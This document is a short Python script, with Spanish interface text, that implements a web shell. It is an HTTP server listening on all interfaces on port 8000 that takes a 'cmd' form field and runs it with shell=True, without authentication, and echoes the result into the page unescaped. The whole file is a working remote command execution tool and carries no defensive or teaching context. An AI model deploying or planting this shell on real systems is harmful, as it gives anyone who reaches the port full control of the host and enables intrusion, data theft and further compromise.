#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import subprocess
import urllib.parse
import base64

class WebShellHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html = '''
        <html>
        <head>
            <title>Web Shell</title>
            <style>
                body { font-family: monospace; margin: 20px; }
                input[type="text"] { width: 80%; padding: 5px; }
                input[type="submit"] { padding: 5px 10px; }
                pre { background: #f0f0f0; padding: 10px; }
            </style>
        </head>
        <body>
            <h2>Web Shell</h2>
            <form method="POST">
                <input type="text" name="cmd" placeholder="Ingresa el comando...">
                <input type="submit" value="Ejecutar">
            </form>
        </body>
        </html>
        '''
        self.wfile.write(html.encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        params = urllib.parse.parse_qs(post_data.decode())
        
        if 'cmd' in params:
            cmd = params['cmd'][0]
            try:
                output = subprocess.check_output(cmd, shell=True)
            except subprocess.CalledProcessError as e:
                output = str(e).encode()
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = f'''
            <html>
            <head>
                <title>Web Shell - Resultado</title>
                <style>
                    body {{ font-family: monospace; margin: 20px; }}
                    pre {{ background: #f0f0f0; padding: 10px; }}
                </style>
            </head>
            <body>
                <h2>Resultado del comando: {cmd}</h2>
                <pre>{output.decode()}</pre>
                <a href="/">Volver</a>
            </body>
            </html>
            '''
            self.wfile.write(html.encode())

def run_server(host, port):
    server = HTTPServer((host, port), WebShellHandler)
    print(f"[*] Servidor web shell iniciado en http://{host}:{port}")
    server.serve_forever()

if __name__ == '__main__':
    HOST = '0.0.0.0'  # Escucha en todas las interfaces
    PORT = 8000       # Puerto por defecto
    run_server(HOST, PORT) 